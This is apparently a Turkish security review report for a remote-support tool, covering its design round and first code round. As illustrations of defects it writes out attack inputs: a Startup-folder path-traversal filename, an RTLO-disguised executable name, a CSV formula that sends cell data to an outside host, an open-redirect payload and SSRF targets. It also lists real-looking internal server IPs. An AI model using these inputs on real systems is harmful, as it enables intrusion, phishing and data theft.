# Güvenlik Raporu — Tasarım turu (Tur 0, kod yok)
Tarih: 2026-11-10 · Kapsam: `docs/mimari.md` §5, `docs/tasarim-kontrol.md` §4, mimari-protokol/akislar/api, ADR-0006/0007/0009/0010
DURUM: DÜZELTİLMELİ (tasarım; ilgili paket başlamadan mimari/AC güncellenmeli)
Özet: Kritik 0 / Yüksek 8 / Orta 10 / Düşük 7

Yöntem: Kod olmadığı için "Yer" = belge:satır/bölüm. Otomatik tarama uygulanamadı (bkz. sondaki bölüm).

## K6 kararı (teknisyen "Katılımcıyı kabul et") — KARAR: EKLENSİN, P3'te, zorunlu
Gerekçe (G-01): ADR-0006'nın kendi hesabı N=50 aktif kodda %9 başarı veriyor; dahası mevcut `verifyCode`
müşteriyi **doğrulamıyor** — `resolve` yanıtında katılan herkese döndürülüyor (mimari-api.md Public tablo),
yani kodu tahmin eden saldırgan da aynı 4 haneyi görür ve telefonda "doğru" okuyabilir. Kabul adımı olmadan
teknisyenin sahte müşteriyi ayırt edecek güvenilir bir sinyali yok. Uygulama biçimi G-01'de.

## Bulgular (öncelik sırasıyla)

### [YÜKSEK] G-01 Müşteri yerine geçme: verifyCode yön hatası + kabul adımı yok — A07 Kimlik Doğrulama Hataları
Yer: mimari.md:166 (T1), mimari-api.md Public `resolve` çıktısı (`verifyCode`), adr/0006 "Sonuçlar", mimari.md:414 (K6)
- Tehdit: A1/A2 kodu brute-force eder (veya linki ele geçirir), `join` ile oturumu tüketir; gerçek müşteri 410 alır
  (DoS), teknisyen sahte uca chat/dosya/talimat gönderir; teknisyen "verifyCode'u okuyun" dediğinde saldırgan da okur.
- Eksik kontrol: katılan tarafın kimliğine bağlı, yalnız ona gösterilen bir sır yok; join anında tüketim gerçek
  müşteriyi kilitliyor; teknisyen onayı olmadan SDP akıyor.
- Önerilen tasarım:
  1. `join` oturumu **tüketmez**; misafir `LOBBY` durumuna girer. Sunucu misafir başına rastgele 4 haneli
     `admitCode` üretir, yalnız o misafire döner (`join` yanıtı), DB/bellekte hash.
  2. Konsola `peer.pending{guestId, name, guestKind, ipCountry?}`; teknisyen müşteriden telefonda `admitCode`'u
     okumasını ister → `guest.admit{guestId}` / `guest.reject{guestId}`. Kabul gelmeden SDP/ICE iletilmez,
     TURN credential verilmez (credential `admit` sonrası `hello` ile).
  3. Tüketim (`consumed_at`, ACTIVE, `active_code=NULL`) **admit** transaction'ında. Reddedilen misafir
     `session.ended{rejected}` alır; kod geçerli kalır → gerçek müşteri kilitlenmez.
  4. Lobide eşzamanlı en çok 3 misafir; lobi bekleme 5 dk; teknisyen 3 ret sonrası "Oturumu iptal et, yenisini aç" önerisi.
  5. Mevcut `verifyCode` adı "Teknisyen doğrulama kodu" olur ve yalnız müşterinin teknisyeni doğrulaması için
     kullanılır; belgede "müşteriyi doğrulamaz" diye yazılır. Kod 6→8 haneye çıkarma ayrıca önerilir (G-02 ile).
  6. Audit: `guest.pending`, `guest.admitted`, `guest.rejected` (ip, ad).
- Paket: P3 (protokol + oda durum makinesi), P4 (konsol lobi UI, müşteri bekleme ekranı), P6 (istemci bekleme ekranı), P2 (durum makinesi alanları).

### [YÜKSEK] G-02 Global başarısız-kod limiti kendisi DoS aracı — A04 Güvensiz Tasarım
Yer: mimari.md:166, adr/0006 "Karar" (global 60/dk, aşımda kod yolu 60 sn 429)
- Tehdit: tek saldırgan dakikada 61 yanlış kod göndererek **tüm tenant'ların** kod ile katılımını kalıcı kapatır
  (Go istemci yolu tamamen kod/dosya adına dayalı → tam erişim modu ölür).
- Eksik kontrol: global sayaç kaynak ayırt etmiyor; üstel ceza ve ağ öneki bazlı sayaç yok.
- Önerilen tasarım: sayaçlar IPv4 /24 ve IPv6 /56 öneki bazında (10/dk) + IP bazında üstel bekleme;
  global sayaç **engelleme değil alarm** eşiği olsun; global eşik aşılırsa yalnız ilgili önekler engellenir.
  Kod 8 haneye (10⁸) çıkarılırsa dağıtık saldırı başarısı ~%0,09'a (N=50) iner; telefonda "4-4" grup okunur.
  Dosya adı yolunda kod okunduğundan uzunluk artışı kullanıcıya maliyetsiz. Token yolu etkilenmez (mevcut).
- Paket: P2 (`codes.ts`), P3 (`rate.ts`, resolve).

### [YÜKSEK] G-03 Kontrol izin diyaloğu tıklama/tuş tuzağı ve spam — A04 Güvensiz Tasarım
Yer: mimari-akislar.md A3, mimari-protokol.md §4.3 (1), adr/0009
- Tehdit: A3 teknisyen `control.request`'i müşteri yazarken/tıklarken art arda gönderir; diyalog odağı alır,
  müşterinin Enter/Space/tıklaması "İzin ver"e düşer → rıza dışı kontrol. Enjekte olmayan olay filtresi bunu engellemez.
- Eksik kontrol: varsayılan buton, giriş gecikmesi, istek hız sınırı tanımlı değil.
- Önerilen tasarım: diyalogda varsayılan/odak "Reddet"; Enter/Space "İzin ver"i tetiklemez; butonlar 1,5 sn
  sonra etkin; diyalog açılırken o anki fare konumunun altında açılmaz; `control.request` sunucuda oturum başına
  ret sonrası 30 sn bekleme + en çok 5 istek/oturum; aynı kurallar `monitor.request` ve `file.offer` kabul diyaloğu için.
  AC-99'a ek kabul kriteri: "İlk 1,5 sn tıklama ve klavye 'İzin ver'i tetiklemez".
- Paket: P7 (gate/ui, server handlers), P5/P6 (dosya kabul diyaloğu).

### [YÜKSEK] G-04 Aktif oturumu yönetici kesemez; hesap/yetki iptali canlı oturumu durdurmaz — A01 Erişim Kontrolü
Yer: mimari.md:157 ("Admin… yalnız görüntüler/iptal eder"), mimari-api.md `/cancel` (409 PENDING değil), mimari.md:152 (≤5 sn yalnız REST)
- Tehdit: ele geçirilmiş/kötü niyetli teknisyen (A3, dolandırıcı) müşteri makinesini kontrol ederken Admin hesabı
  pasife alır, şifre sıfırlar veya `remote_control.use`'u kapatır — açık WS ve P2P kontrol sürer.
- Eksik kontrol: ACTIVE oturum için Admin/Super Admin "Zorla sonlandır"; deaktivasyon/logout-all/yetki değişimi →
  canlı WS kapatma; `requirePerm` WS'de yalnız istek anında.
- Önerilen tasarım: `POST /sessions/:id/terminate` (Admin aynı tenant, Super Admin), oda → `session.ended{admin}`
  her iki tarafa; istemci `session.ended`'de gate kapatır ve çıkar (mevcut AC-107). `users.deactivate`,
  `logout-all`, auth_session revoke, yetki geri alımı → `rooms.endByTechnician(userId)` ve `remote_control.use`
  kaldırıldıysa misafire `control.revoke` (istemci gate kapatır). WS tech soketi her 60 sn auth_session'ı yeniden doğrular. Audit `session.terminated`.
- Paket: P3 (rooms), P7 (control.revoke), P9 (deaktivasyon), P10 (logout-all).

### [YÜKSEK] G-05 TURN `denied-peer-ip` listesi eksik — A10 SSRF
Yer: adr/0007 "Karar", mimari.md:174 (T9)
- Tehdit: anonim misafir (join sonrası TURN credential alır) relay ile kendi altyapımıza erişir: uygulama sunucusu
  185.126.217.99 (MySQL/metrics/iç portlar dışa açıksa), Proxmox 185.126.217.113 yönetim arayüzü, TURN VM'nin
  kendisi, aynı /24'teki diğer sunucular; IPv4-mapped IPv6 (`::ffff:10.0.0.1`), NAT64 (`64:ff9b::/96`), 6to4 (`2002::/16`) ile özel aralık atlatma.
- Eksik kontrol: kendi public IP'lerimiz ve geçiş aralıkları listede yok.
- Önerilen tasarım: listeye ekle — `192.0.0.0/24`, `192.0.2.0/24`, `198.18.0.0/15`, `198.51.100.0/24`,
  `203.0.113.0/24`, `224.0.0.0/4`, `240.0.0.0/4`, `255.255.255.255`, `::/128`, `::ffff:0:0/96`, `64:ff9b::/96`,
  `100::/64`, `2001::/32`, `2001:db8::/32`, `2002::/16`, `ff00::/8`, **TURN VM IP, 185.126.217.99, 185.126.217.0/24
  (sağlayıcı bloğu; meşru müşteri bu bloktan gelmeyecek), Proxmox yönetim IP'si**. `turnserver.conf` için
  `turnutils_uclient` ile her aralığa negatif test P3 "bitti" kanıtına eklensin. `no-tcp-relay` korunur.
- Paket: P3 (`deploy/turn/turnserver.conf`), P13 (runbook: IP değişiminde listeyi güncelle).

### [YÜKSEK] G-06 Gelen dosyada yol/ad saldırıları, MOTW yok, uyarı listesi eksik — A08 Bütünlük / A03 Enjeksiyon
Yer: mimari-protokol.md §4.1 `file.offer.name`, §4.2 (Go `%USERPROFILE%\Downloads`), AC-36
- Tehdit: teknisyen (veya müşteri yerine geçen saldırgan teknisyene) `name="..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\a.exe"`,
  ADS `rapor.txt:evil.exe`, aygıt adları (`CON`, `NUL`), sondaki nokta/boşluk, RTLO (`U+202E`) ile `fatura‮fdp.exe` → ".pdf" görünen exe;
  MOTW olmadan alınan exe SmartScreen'siz çalışır.
- Eksik kontrol: ad temizleme kuralı, MOTW, tam tehlikeli uzantı listesi, gerçek bayt sayısına göre sınır.
- Önerilen tasarım: alıcı tarafta (Go + tarayıcı) `filepath.Base` + `[\\/:*?"<>|\x00-\x1F]` ve Unicode bidi/format
  karakterleri (Cf kategorisi) silinir, ayrılmış adlar ön ek alır, uzunluk ≤ 255; çakışmada `(1)` eklenir, üzerine yazılmaz.
  Go istemci yazılan dosyaya `:Zone.Identifier` (`ZoneId=3`) ADS ekler. Uyarı listesine `.lnk .hta .cpl .msc .jar .dll .com .pif .reg .scf .url .chm .wsf .psm1 .iso .img .vhd .vhdx .appx .msix .appinstaller .application .xll .docm .xlsm`
  eklenir; çift uzantı (`.pdf.exe`) ayrıca vurgulanır. Alıcı `size` yerine **alınan bayt** sayacına göre `maxFileBytes` aşımında keser.
- Paket: P5 (contracts `dc.ts`, web alıcı), P6 (Go alıcı).

### [YÜKSEK] G-07 İmzasız binary bütünlüğü yalnız aynı kaynaktan doğrulanıyor — A08 Yazılım/Veri Bütünlüğü
Yer: adr/0010 "Hash yayını", mimari.md:178 (T13), tasarim-kontrol.md:58
- Tehdit: publish sunucusu ele geçirilirse saldırgan exe'yi, `AGENT_SHA256` env'ini ve karşılama sayfasındaki hash'i
  birlikte değiştirir → tüm müşterilere zararlı dağıtılır; aynı origin'deki hash hiçbir şey kanıtlamaz. Fork'lanmış
  açık kaynak koddan "NoktaDestek" versioninfo'lu, dolandırıcı sunucuya bağlı kopya ayırt edilemez.
- Eksik kontrol: sunucudan bağımsız imza/köken kanıtı.
- Önerilen tasarım: (1) `agent-win.yml`'de GitHub Artifact Attestations (`actions/attest-build-provenance`,
  SLSA provenance, ücretsiz) + Sigstore/cosign veya çevrim dışı anahtarlı **minisign** imzası Release'e;
  (2) sunucu açılışta binary hash'ini env değil, CI'nın imzaladığı `SHA256SUMS.minisig`'i gömülü açık anahtarla
  doğrular; (3) istemci karşılama penceresi kendi SHA-256 parmak izinin ilk 8 hanesini ve bağlandığı alan adını
  gösterir, teknisyen konsolu beklenen değeri gösterir (telefonla teyit); (4) SignPath Foundation başvurusu "Sonra"
  değil P6 ile paralel başlatılsın; (5) `serverURL` ldflags dışında değiştirilemez (komut satırı/env/registry yok).
- Paket: P6, P13 (runbook: imza anahtarı saklama/rotasyon).

### [YÜKSEK] G-08 DLL arama sırası ele geçirme (Downloads klasöründen çalışan imzasız exe) — A08
Yer: adr/0004/0010 (Go + `go-ole`, Media Foundation), mimari.md:353
- Tehdit: exe `Downloads`'tan çalışır; aynı klasöre daha önce (drive-by) indirilmiş `version.dll`, `dwmapi.dll`,
  `mfplat.dll`, `winmm.dll` vb. süreç tarafından yüklenir → müşteri kullanıcısı bağlamında kod çalışır, üstelik
  "Nokta Destek" adına. `syscall.NewLazyDLL`/`LoadLibrary` uygulama dizinini önce arar.
- Eksik kontrol: DLL yükleme politikası tanımsız.
- Önerilen tasarım: `main` başında `SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32)`; tüm DLL'ler
  `windows.NewLazySystemDLL`; `go-ole` ve üçüncü parti paketler incelenir (gerekirse ince sarmalayıcı);
  PE import tablosunda yalnız KnownDLLs/System32; `%TEMP%`'e DLL/çalıştırılabilir çıkarma yasak.
  P6 "bitti" kanıtına: Procmon ile Downloads dizininde DLL arama olayı 0.
- Paket: P6.

### [ORTA] G-09 P2P yetkiler sunucuda uygulanamıyor (`file_transfer.use`); kontrol isteği kanalı — A01
Yer: mimari-api.md yetki tablosu, mimari-protokol.md §3 `file.meta` ("iki taraf→S"), §4.1
- Tehdit: `file_transfer.use` yetkisi olmayan teknisyen tarayıcı JS'ini değiştirip `ctl` DC'den `file.offer` yollar;
  sunucu yalnız (isteğe bağlı) `file.meta` görür. Benzer şekilde `control.request` DC'den gelirse istemci diyalog açabilir.
- Önerilen tasarım: sunucu `hello` (guest) içinde teknisyen yetenek listesini (`caps: ["file_transfer","remote_control"]`)
  gönderir; istemci/müşteri sayfası listede olmayan DC isteklerini reddeder; `control.request` yalnız WS (sunucu)
  kaynağından kabul edilir, DC'de bu tip yok sayılır; yetki değişince `caps.update` (G-04).
- Paket: P5, P6, P7.

### [ORTA] G-10 Ticket ve reconnectToken URL sorgusunda; reconnect ile gerçek misafiri düşürme — A07
Yer: mimari-protokol.md §1 (`?ticket=`, `&reconnect=`), mimari.md:277 (redaksiyon yalnız `/session/<token>`)
- Tehdit: Caddy access log / pino `req.url` sorgu dizesini yazar; `reconnectToken` oturum boyu geçerli → log
  okuyan biri kopma penceresinde misafir yuvasını ele geçirir; misafir bağlıyken reconnect davranışı tanımsız.
- Önerilen tasarım: ticket/reconnect `Sec-WebSocket-Protocol` başlığında veya upgrade sonrası ilk `auth` mesajında
  (5 sn timeout); Caddy log formatında sorgu dizesi maskelenir; reconnect yalnız `guestSocket` yokken kabul,
  aksi halde ret + audit `reconnect.conflict`; reconnect sonrası G-01 lobisine gerek yok ama kontrol `VIEW` (mevcut).
- Paket: P3, P1 (Caddy log).

### [ORTA] G-11 Gerçek istemci IP'si (trustProxy) ve IPv6 limit birimi tanımsız — A04
Yer: mimari.md:154, :166; tasarim-kontrol.md:36
- Tehdit: Fastify `trustProxy: true` ile `X-Forwarded-For` sahtelenir → tüm IP limitleri (login 20/dk, resolve
  10/dk) atlanır; tek IPv6 /64 sınırsız adres sağlar.
- Önerilen tasarım: `trustProxy` yalnız Caddy konteyner adresi; Caddy gelen XFF'yi ezer; limit anahtarı IPv4 /32, IPv6 /64.
- Paket: P1, P3.

### [ORTA] G-12 SMTP/MySQL test uçlarıyla iç ağ taraması (SSRF) — A10
Yer: mimari-api.md `/settings/smtp/test`, `/admin/settings/mysql/test`
- Tehdit: tenant Admin'i (Super Admin'den az güvenilir) SMTP host'una `mysql`, `server:3001`, `169.254.169.254`,
  Proxmox LAN adresleri yazar; ayrıntılı hata/banner ve süre farkıyla port taraması yapar.
- Önerilen tasarım: tenant SMTP host'u çözümlenen IP özel/loopback/link-local/Docker ağıysa ret (DNS rebinding için
  bağlantı çözümlenen IP'ye yapılır); hata mesajı genel ("bağlanılamadı/kimlik reddedildi"); test 5/dk; MySQL testi yalnız Super Admin (mevcut) + audit.
- Paket: P10, P11.

### [ORTA] G-13 Anonim misafire 4 saatlik TURN credential; bant sınırı yok — A04
Yer: adr/0007 (expiry ≤ 4 sa, `user-quota=4`)
- Tehdit: join yapan (veya G-01 ile sızan) misafir credential'ı oturum bittikten sonra da kullanır → anonim relay
  (kaynak gizleme, bant tüketimi). HMAC credential iptal edilemez.
- Önerilen tasarım: ömür `min(kalan süre, 60 dk)` ve WS üzerinden `ice.refresh` ile yenileme; misafire credential
  yalnız admit sonrası (G-01); coturn `max-bps` (ör. 6 Mbps) ve `bps-capacity`; Prometheus'ta oturumsuz allocation alarmı.
- Paket: P3.

### [ORTA] G-14 Sinyalizasyonu kontrol eden DTLS'i MITM edebilir — A02 Kriptografik Hatalar
Yer: mimari.md:178 ("pinning yok"), :188 ("yalnız DTLS-SRTP")
- Tehdit: kurumsal TLS denetim proxy'si (istemci sistem kökünü kullanır) veya ele geçirilmiş sunucu SDP'deki
  `a=fingerprint`'i değiştirip medyayı/girdiyi araya girerek okur/değiştirir; "sunucu medya görmez" iddiası yalnız dürüst sunucuda geçerli.
- Önerilen tasarım: iki uçta her iki DTLS parmak izinden türetilen 4–6 haneli SAS (`HMAC(fpTech||fpGuest)`) konsolda
  ve istemcide gösterilir; kontrol izni diyaloğunda da görünür; uyuşmazlık müşteriye "bağlantı güvenli değil" olarak yansır. Belgede güven varsayımı açık yazılır.
- Paket: P4, P6.

### [ORTA] G-15 Audit maskesi hem eksik hem aşırı; tetikleyici uygulama kullanıcısınca düşürülebilir — A09
Yer: mimari.md:122-124, :283 (`migrate deploy` server başlangıcında)
- Tehdit: regex `ticket`, `credential` (TURN), `recovery`, `cookie`, `authorization`, `sdp` (ICE pwd + iç IP)
  yakalamaz; `key` ise `perm_key`'i maskeler → yetki değişikliği audit'i okunamaz. Uygulama aynı DB kullanıcısıyla
  migration yaptığı için `DROP TRIGGER` yetkisi vardır → audit değiştirilebilir.
- Önerilen tasarım: anahtar adına göre **izinli liste** (`perm_key` açık) + kara liste genişletmesi; iki DB kullanıcısı:
  `migrator` (DDL, yalnız deploy işinde) ve `app` (audit_logs'ta yalnız INSERT/SELECT, TRIGGER/ALTER/DROP yok).
  Audit yazımı başarısızsa kontrol izni olayları (`control.state GRANTED`) reddedilir (fail-closed).
- Paket: P1, P11, P13.

### [ORTA] G-16 CSV export'ta formül enjeksiyonu — A03 Enjeksiyon
Yer: mimari-api.md `/sessions/export.csv`, `/audit/export.csv`
- Tehdit: müşteri adı `=HYPERLINK("http://x/?"&A1)` veya `=cmd|...`; Excel'de açan Admin'de veri sızıntısı/komut.
- Önerilen tasarım: `= + - @ \t \r` ile başlayan hücrelere `'` öneki; customerName, ticket, note, file_name, user_agent dahil. Birim test.
- Paket: P8, P11.

### [ORTA] G-17 Dolandırıcılık (tech-support scam) kötüye kullanım kontrolleri eksik — A04
Yer: mimari.md:168 (T3), tasarim-kontrol.md:61
- Tehdit: A2/A3 meşru tenant içinden (veya kendi kurduğu fork'la) "banka/Microsoft destek" araması yapar; kontrolü
  alıp gösterge üstüne tam ekran topmost pencere açar, banka işlemi yaptırır.
- Önerilen tasarım: (1) istemci + karşılama sayfasında onaydan önce sabit uyarı: "Sizi kendiliğinden arayan biri
  bunu istediyse kapatın; banka/şifre işlemi yapmayın"; (2) ekran karartma/gizli mod özelliği **yasak** (gereksinimlere
  kapsam dışı olarak yazılsın); (3) göstergeler 1 sn'de bir `HWND_TOPMOST` ile yeniden öne alınır, kırmızı çerçeve
  tüm monitörlerde; (4) karşılama/istemcide "Kötüye kullanımı bildir" bağlantısı → Super Admin'e e-posta + audit;
  (5) Super Admin tenant oluştururken firma doğrulaması runbook adımı; (6) oturum sonunda müşteriye özet (teknisyen, süre, kontrol süresi, dosyalar) gösterilir.
- Paket: P4, P6, P7, P13.

### [ORTA] G-18 CI/tedarik zinciri sertleştirmesi tanımsız — A06/A08
Yer: tasarim-kontrol.md:51, :97; adr/0010 "Tekrarlanabilir build"
- Tehdit: üçüncü parti GitHub Action etiketi değiştirilir (tj-actions benzeri), Release yazma yetkili token ile binary değiştirilir.
- Önerilen tasarım: tüm Action'lar commit SHA ile sabit; `permissions:` en az (varsayılan `contents: read`, yalnız release
  işinde `contents: write`, `id-token: write`, `attestations: write`); Release yalnız korumalı `v*` etiketinden ve
  onaylı `environment`'tan; PR'den gelen fork workflow'larına secret yok; `go.sum` + `GOFLAGS=-mod=readonly`,
  `GOTOOLCHAIN` sabit; `pnpm install --frozen-lockfile`; Dependabot/Renovate; Scorecard önerilir.
- Paket: P1, P6.

### [DÜŞÜK] G-19 CSP ayrıntıları — A05 Yanlış Yapılandırma
Yer: mimari.md:194-196
- `connect-src` port içermeli (`wss://<host>:4450`); `style-src` nonce'u `style=""` özniteliklerini kapsamaz →
  geliştirici `'unsafe-inline'` eklemesin, inline style yerine sınıf/CSS değişkeni kuralı yazılsın; `worker-src 'self'`,
  `manifest-src 'self'`, `upgrade-insecure-requests`, `Cross-Origin-Resource-Policy: same-origin` eklensin; Caddy/Next
  `Server`/`X-Powered-By` kaldırılsın. HSTS `includeSubDomains` tüm alan adını etkiler — diğer alt alanların HTTPS olduğu doğrulanmalı. Paket: P1, P4.

### [DÜŞÜK] G-20 Native WS kuralı ve gizli değer entropisi belirsiz — A07
Yer: mimari-protokol.md §1 (`User-Agent: NoktaDestek` kabul)
- User-Agent bir güvenlik kontrolü değildir; belgede "yalnız bilgi" diye yazılsın, kuralı `ticket.kind` belirler (mevcut).
  `joinNonce`, `wsTicket`, `reconnectToken`, `admitCode` dışındakiler için ≥128 bit CSPRNG, karşılaştırma `timingSafeEqual` açıkça tanımlansın. Paket: P3.

### [DÜŞÜK] G-21 Global kısayol kaydı başarısız olabilir — A04
Yer: mimari-protokol.md §4.3 (2), AC-102
- Başka uygulama Ctrl+Shift+F12'yi tutuyorsa `RegisterHotKey` başarısız olur; bu durumda kontrol izni verilmesin veya
  yedek kısayol (Ctrl+Shift+F11) kaydedilip ekranda gösterilsin. Paket: P7.

### [DÜŞÜK] G-22 Oturum kayıtlarında tutarsızlık ve sahiplik ayrıntısı — A01
Yer: mimari-api.md `/sessions` notu ("link… GET /:id PENDING iken") ↔ mimari.md:106 (yalnız `token_hash`)
- Düz token DB'de olmadığına göre GET `/:id` link döndüremez; geliştirici geri döndürülebilir saklamaya kaymasın — metin
  "yalnız POST yanıtında" olarak düzeltilsin. `short_code` düz metin (kısa ömürlü, kabul) ama `active_code` dışında NULL'lansın.
  USER rolü için detay/PATCH/export'ta da `technician_id = user.id` kuralı açıkça yazılsın (yalnız liste değil). Paket: P2, P8.

### [DÜŞÜK] G-23 Hesap kilitleme ile hizmet engelleme; e-posta gönderim limiti — A07
Yer: mimari.md:154, mimari-api.md `/sessions/:id/email`
- Saldırgan bilinen teknisyen e-postalarını 15 dk'da bir kilitler. Öneri: kilit hesap+IP bileşimi, tam kilit yalnız
  IP'den bağımsız 20 hata/sa; kilitli hesaba bildirim e-postası. Oturum linki e-postası teknisyen başına 20/sa. Paket: P1, P10.

### [DÜŞÜK] G-24 `consentTextId` doğrulaması tanımsız — A04
Yer: mimari-api.md `/public/sessions/join`
- Sunucu `consentTextId`'nin oturumun tenant'ına ait ve `is_current` olduğunu doğrulamalı; aksi halde başka tenant'ın/eski metnin onayı kaydedilir. Paket: P4.

### [DÜŞÜK] G-25 Belge çelişkileri — A05
Yer: tasarim-kontrol.md:99 (runbook "kod imzalama yenileme"), gereksinimler AC-27/AC-94/AC-96 ("imzalı")
- İmza yokken runbook maddesi "imza/attestation anahtarı yönetimi" (G-07) olarak değiştirilsin; K8 kapanmadan P6 başlamasın. Paket: P6, P13.

## Otomatik tarama çıktıları
- `npm/pnpm audit`, `govulncheck`, `pip-audit`, `dotnet`: **uygulanamadı** — repoda henüz kaynak kod/lockfile yok (yalnız `docs/`).
- Gizli bilgi taraması (`git grep`): **uygulanamadı** — dizin git deposu değil. `docs/` elle tarandı: gerçek şifre/anahtar/token yok
  (yalnız `TURN_SECRET`, `METRICS_TOKEN` gibi değişken adları).
- `.env` git geçmişi: depo yok; P1'de `.gitignore` + gitleaks ile kurulacak (T18).

## Tasarımda vaat edilip eksik/çelişkili olanlar
- T1 "verifyCode telefonda teyit" → müşteriyi doğrulamaz (resolve'da herkese dönüyor) — G-01.
- T9 "özel IP relay yasağı" → kendi public IP'lerimiz ve IPv6 geçiş aralıkları yok — G-05.
- T13 "SHA-256 doğrulama" → aynı origin; sunucu ele geçirilmesine karşı koruma yok — G-07.
- "Admin iptal eder" → yalnız PENDING; ACTIVE oturumu kesecek yetki yok — G-04.
- `file_transfer.use` yetkisi P2P'de sunucuda uygulanamaz — G-09.
- Audit "değiştirilemez" → migration kullanıcısı = uygulama kullanıcısı, tetikleyici düşürülebilir — G-15.
- Log maskeleme `/session/<token>` dışında WS sorgu dizesini kapsamıyor — G-10.

## Olumlu
- İzin kapısı istemcide, sunucu mesajı açamaz; yeniden bağlanmada kapalı; enjekte olay filtresi; AC-101 otomatik testi.
- Opak DB oturumu (JWT yok), SameSite=Strict + double-submit CSRF + Origin; CORS kapalı.
- Token/nonce/ticket yalnız hash; resolve tüketmez (e-posta tarayıcı ön-getirmesi linki yakmaz); join koşullu UPDATE ile yarışsız.
- TURN `use-auth-secret`, `no-tcp-relay`, `no-cli`, ayrı VM/IP; statik secret istemciye gitmez.
- Upload: magic bytes + sharp yeniden kodlama, SVG yok, nosniff.
- İstemci: admin yok, kalıcılık yok, dinleyen port yok, UPX yok, TLS doğrulamalı, Ctrl+Alt+Del/Win+L iletilmez.
- Açık kaynak için gitleaks + lisans taraması + SBOM planlı; prod açılışı 2FA (P10) sonrasına bağlı.

## Öneri: `docs/gereksinimler.md` §9'a "Sonra" olarak
G-13 (credential yenileme ayrıntısı), G-14 (SAS), G-19..G-25. Yüksek bulgular (G-01..G-08) "Sonra" olamaz;
ilgili paket başlamadan mimari/AC'ye işlenmelidir (G-01, G-02, G-05, G-10, G-13 → P3 öncesi).

## P1 kod turu
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 3 / Düşük 8 — Orta bulgular P2 başlamadan kapatılmalı (S1-1 ve S1-2 düşük maliyetli).

### Bulgular (öncelik sırasıyla)

#### S1-1 [ORTA] `safeNext` sekme/satır sonu ile açık yönlendirme — A01
Yer: apps/web/lib/api.ts:89-92, kullanım apps/web/app/(auth)/login/login-form.tsx:45
Tehdit: `/login?next=%2F%09%2Fevil.example` → `next="/\t/evil.example"` kontrolü geçer; WHATWG URL ayrıştırıcısı
TAB/LF/CR'yi atar → `//evil.example`. Next 16 `router.replace` dış origin'i `completeHardNavigation` ile açar
(navigate-reducer.js:34). Doğrulandı: `new URL("/\t/evil.example", base).origin === "https://evil.example"`.
Kurban başarılı girişten hemen sonra sahte "oturum süresi doldu" sayfasına gider → kimlik bilgisi avı.
Öneri: `const u = new URL(next, location.origin); if (u.origin !== location.origin) return fallback; return u.pathname + u.search;`
ya da `/^\/(?![\/\\])[\x21-\x7e]*$/` izinli kalıbı (kontrol karakteri yok). Birim test: `\t`, `\n`, `\r`, `/\`, `//`, `%09`.
Atanan: frontend-dev

#### S1-2 [ORTA] Hesap geneli kilit sayacı yarışta kaybolur (kayıp güncelleme) — A07 (G-23)
Yer: apps/server/src/auth/service.ts:38-50 (sayım `user.failedLoginCount`'tan, kullanıcı TX dışında :67'de okunur), repo.ts:41-47
Tehdit: argon2 doğrulaması ~onlarca ms sürer; farklı IP'lerden eşzamanlı N deneme hepsi aynı eski sayacı okuyup `count+1` yazar
→ 20/sa hesap geneli sınır pratikte hiç tetiklenmez. Hesap+IP kilidi (5/15 dk) IP sayısıyla çarpılır; dağıtık brute-force'a
karşı kalan tek global sınır etkisizleşir (2FA P10'a kadar yok).
Öneri: atomik artırım — `UPDATE users SET failed_login_count = IF(failed_window_at > NOW(3) - INTERVAL 1 HOUR, failed_login_count + 1, 1), failed_window_at = IF(...)`
sonra değeri oku (veya TX içinde `SELECT ... FOR UPDATE`). Eşzamanlı 25 isteklik entegrasyon testi. Atanan: backend-dev

#### S1-3 [ORTA] Şifre değişimi diğer oturumları düşürmez; mevcut şifre denemesi sınırsız — A07
Yer: apps/server/src/auth/service.ts:105-118, repo.ts:49-51
Tehdit: (a) çalınmış oturum çerezi kurbanın şifre değişiminden sonra da 8 sa'e kadar geçerli kalır (ASVS 3.3.3);
(b) çerezi ele geçiren saldırgan `/auth/password/change` ile `current`'ı limitsiz dener (her deneme argon2 19 MiB → CPU/bellek DoS),
bulunca şifreyi değiştirip hesabı kalıcı ele geçirir.
Öneri: aynı TX'te `auth_sessions` → `revoked_at = now` (mevcut hariç; tercihen mevcut da yenilenir — yeni token + çerez);
`current` hatalarını hesap+IP sayacına bağla (5 hata → oturumu iptal + 423), audit `auth.password_change fail` zaten var.
Atanan: backend-dev

#### S1-4 [DÜŞÜK] `next=` tam yol + sorgu taşıyor (bilinen not) — A04 / G-10
Yer: apps/web/proxy.ts:10, :34-38
Değerlendirme: P1'de `/session/*` sayfası olmadığından bugün sızıntı yok; Caddy sorgu dizesini (Caddyfile:33) ve `Location`'ı
(:41) siliyor, `Referrer-Policy: no-referrer` var, pino `maskUrl` sorguyu atıyor. Risk P2'de doğar: oturumsuz müşteri
`/session/<token>` açınca `/login?next=%2Fsession%2F<token>`'a gider (akış bozulur + token tarayıcı geçmişi/ekran paylaşımında
ikinci URL'de). Şiddet: Düşük, **P2 giriş şartı**.
Öneri: `PUBLIC_PATHS` önek eşleşmeli (`/login`, `/session/`, ileride `/download`); `next` yalnız panel önekleri için ve sorgusuz
üretilsin; `/session/` hiçbir zaman `next`'e yazılmasın (birim test). Atanan: frontend-dev

#### S1-5 [DÜŞÜK] Hesap kilidiyle kullanıcı numaralandırma — A07
Yer: apps/server/src/auth/service.ts:41-57, :70-74
Tehdit: hesap geneli kilit yalnız var olan kullanıcıda oluşur; ≥4 IP'den 20 hatalı deneme sonrası var olan hesap 423,
olmayan 401 döner. Kilitli hesapta argon2 atlanır (zamanlama farkı ama durum kodu zaten farklı). 401 yolları için dummy argon2 doğru.
Öneri: kilit kararı verilen yanıt (`pairLocked||accountLocked`) yerine hesap geneli kilit bilgisini yalnız sonraki doğru şifrede
göster; ya da var olmayan login için de bellek içi hesap sayacı (login adı anahtarlı) tutarak aynı 423'ü üret. Atanan: backend-dev

#### S1-6 [DÜŞÜK] Hesap+IP kilidi eşzamanlı isteklerle 4 kat aşılır — A07
Yer: apps/server/src/auth/service.ts:69 (`blockedFor`) ↔ :78 (`hit`, argon2'den sonra)
Tehdit: aynı IP'den paralel 20 istek kontrolü birlikte geçer → 15 dk'da 5 yerine ~20 deneme (IP limiti 20/dk ile sınırlı).
Öneri: `hit` doğrulamadan önce sayılsın, başarılı girişte `reset`; veya ikili başına uçuşta-istek kilidi. Atanan: backend-dev

